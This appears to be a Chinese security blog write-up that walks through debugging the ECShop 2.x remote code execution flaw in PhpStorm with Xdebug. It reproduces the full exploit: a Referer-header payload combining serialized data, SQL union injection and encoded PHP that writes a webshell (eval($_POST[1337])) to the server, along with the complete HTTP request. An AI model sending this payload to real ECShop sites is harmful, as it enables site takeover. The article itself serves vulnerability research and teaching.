***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 一、背景介绍

 **号称国内最大的开源网店系统，可以直接远程写入webshell。**

本文会通过动态分析来解析漏洞每个细节，关于漏洞原理可以看[漏洞原理](http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)，讲的很详细，本文重点介绍动态分析审计的技巧和如何调试漏洞，关于漏洞本身也是一个很值得学习的漏洞，能构造出这个攻击链是需要对每个细节都有深刻的认识才能实现的。

## 二、动态调试环境搭建

自行下载安装phpstudy和phpstorm

首先确定php版本

然后修改配置文件  

![image.png](https://image.3001.net/images/20180905/1536130259_5b8f7cd3e0cd5.png!small)

修改php.ini中如下

[XDebug]

    
    
    xdebug.profiler_append = 0
    
    xdebug.profiler_enable = 1
    
    xdebug.profiler_enable_trigger = 0
    
    xdebug.profiler_output_dir ="C:\phpStudy\tmp\xdebug"
    
    xdebug.trace_output_dir ="C:\phpStudy\tmp\xdebug"
    
    xdebug.profiler_output_name = "cache.out.%t-%s"
    
    xdebug.remote_enable = 1
    
    xdebug.remote_handler = "dbgp"
    
    xdebug.remote_host = "127.0.0.1"
    
    zend_extension="C:\phpStudy\php53\ext\xdebug.dll"
    
    xdebug.remote_port=9000
    
    xdebug.idekey= PHPSTROM

设置php版本，一定要对应上

![image.png](https://image.3001.net/images/20180905/1536130291_5b8f7cf372743.png!small)

下面图片是默认的不用动

![image.png](https://image.3001.net/images/20180905/1536130316_5b8f7d0c9104c.png!small)

下面的修改key和端口如下

![image.png](https://image.3001.net/images/20180905/1536130351_5b8f7d2fbb6f2.png!small)

![image.png](https://image.3001.net/images/20180905/1536130369_5b8f7d41e0b34.png!small)在这里配置根目录调试环境  
![image.png](https://image.3001.net/images/20180905/1536130398_5b8f7d5ed844d.png!small)

![image.png](https://image.3001.net/images/20180905/1536130415_5b8f7d6fef821.png!small)

这里就留一个Chrome浏览器

![image.png](https://image.3001.net/images/20180905/1536130441_5b8f7d8921ee0.png!small)

Chrome浏览器要安装插件JetBrains IDE Support 下载安装好了不用修改配置，这样就基本可以了。

## 三、漏洞动态调试分析

下面进行动态分析，动态分析的好处就是漏洞分析起来更加清晰。

##
![image.png](https://image.3001.net/images/20180905/1536130644_5b8f7e54b3640.png!small)

下断点这里我们断到了漏洞起始点方便分析每一个细节，然后点击debug，

然后浏览器会打开

![image.png](https://image.3001.net/images/20180905/1536130681_5b8f7e796257d.png!small)

然后点击登录，会触发断点，可以看到停到了断点处

![image.png](https://image.3001.net/images/20180905/1536130708_5b8f7e9418623.png!small)

下面介绍使用的一些快捷键：

f7会跟进函数 ，

f8 步出也就是一行一行走，不进入函数，有些循环或者不想看的函数直接f8，

进入函数后想跳出去就用shift+f8

Ctrl+art加 点击想要看的函数就会进入

Alt +f7 会搜索谁调用了这个函数或者变量

笔者常用的就这些，掌握这些技能后就可以调试

这里HTTP_REFFER可控到赋值到$back_act

![image.png](https://image.3001.net/images/20180905/1536130749_5b8f7ebd50a0f.png!small)

我们先用burp抓包测试下漏洞 ，先分析下payload

    
    
    554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}

554fcae493e564ee0dc75bdf2ebf94caads
这串可以分解成两块，一个是554fcae493e564ee0dc75bdf2ebf94ca，一个是ads，ads是控制函数流程进入到insert_ads函数，554fcae493e564ee0dc75bdf2ebf94ca前面的这个就是个hash，后面会对它判断，判断后会把它去掉，没有它是进入不了攻击链的，后面再动态分析过程会介绍到。

后面的编码部分解开是这样

    
    
    {$asd'];assert(base64_decode('file_put_contents('1.php','<?php eval($_POST[1337]); ?>')'));//}xxx

发包

    
    
    GET /upload/user.php?act=login HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Cookie: ECS_ID=3e839434a217e8c1f2a931f70086935a43141a6d; ECS[visit_times]=1
    
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10--    -";s:2:"id";s:3:"'/*";}
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1

![image.png](https://image.3001.net/images/20180905/1536131151_5b8f804f1d78e.png!small)

可以看的成功写入webshell

![image.png](https://image.3001.net/images/20180905/1536131174_5b8f8066a0111.png!small)

然后我们继续调试，我们先一路f8走到这里，然后再f7进入看看

![image.png](https://image.3001.net/images/20180905/1536131192_5b8f8078aee2b.png!small)

这里的关键点是insert_mod,动态调用，因为我们没办法抓包发送payload测试，所以这里面我们需要自己修改参数让流程按照payload攻击链来执行，攻击链中需要执行insert_ads,下面的有个hash判断

![image.png](https://image.3001.net/images/20180905/1536131230_5b8f809e0a8bb.png!small)

下面的可以看到有这个hash，所以这里不需要控制，然后继续流程

![image.png](https://image.3001.net/images/20180905/1536131248_5b8f80b024aa8.png!small)![image.png](https://image.3001.net/images/20180905/1536131258_5b8f80ba185c1.png!small)

下面图片中会把hash去掉然后剩下$k,$k中的1，3,5,7都可以控制，所以这里我们在1修改它的值为我们的payload，右键点击setvalue

![image.png](https://image.3001.net/images/20180905/1536131279_5b8f80cf1a509.png!small)

把这payload重新复制，右键setValue，这里直接复制会报错，还是一点点修改吧，然后双引号要转义

    
    
    ads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}

#
![image.png](https://image.3001.net/images/20180905/1536131411_5b8f8153b9901.png!small)

继续f7进入到insert_mod里面，然后发现，insert_ads函数已经控制了，但是payload被反序列化时候$para为false，说明我们的payload有问题，点击debug重新来。

![image.png](https://image.3001.net/images/20180905/1536131441_5b8f817164aa4.png!small)

换了个位置修改，在反序列化函数之前修改，下面图片可以看到$para有值了，是我们的payload

![image.png](https://image.3001.net/images/20180905/1536131460_5b8f8184c175e.png!small)

继续走来到了insert_ads，一路f8，让我们的payload代入进了变量num

最后拼接成了这样

![image.png](https://image.3001.net/images/20180905/1536131490_5b8f81a2e3e73.png!small)

继续往下走，一路f8来到这里

![image.png](https://image.3001.net/images/20180905/1536131507_5b8f81b3bd66c.png!small)

然后f7进入看看，会把payload代入_eval代码执行函数，在这里payload还会被fetch_str处理，f7进入看看  

![image.png](https://image.3001.net/images/20180905/1536131523_5b8f81c3d1781.png!small)

F8来到这里，在这里之前source都没有变化，经过了preg_replace会处理掉{  

payload变成$asd’;]assertxxx 代入到了select里

这个select函数跟入不进去，只能静态分析下了，可以这样寻找ctrl+shift+f

![image.png](https://image.3001.net/images/20180905/1536131557_5b8f81e53940a.png!small)

在select中进入了get_val,substr去掉了$

![image.png](https://image.3001.net/images/20180905/1536131573_5b8f81f536539.png!small)

Payload变成了：asd’;]assertXXX

进入到了make_var

![image.png](https://image.3001.net/images/20180905/1536131592_5b8f8208aa315.png!small)

最后拼接到了

![image.png](https://image.3001.net/images/20180905/1536131608_5b8f821844b14.png!small)

最终payload变成

    
    
    $this->_var['asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//']

最后来到eval  

![image.png](https://image.3001.net/images/20180905/1536131636_5b8f8234884f3.png!small)

这里再走一下就把shell写进去了

## 四、总结

通过动态分析的方式可以很简单的理解漏洞的攻击过程，可以清楚的了解payload在每个环节的处理过程，同时也方便我们进行进一步的修改和测试，对payload的构造能力进一步提升，希望能帮助到大家。

 ***本文作者：alphalab，转载请注明来自FreeBuf.COM**

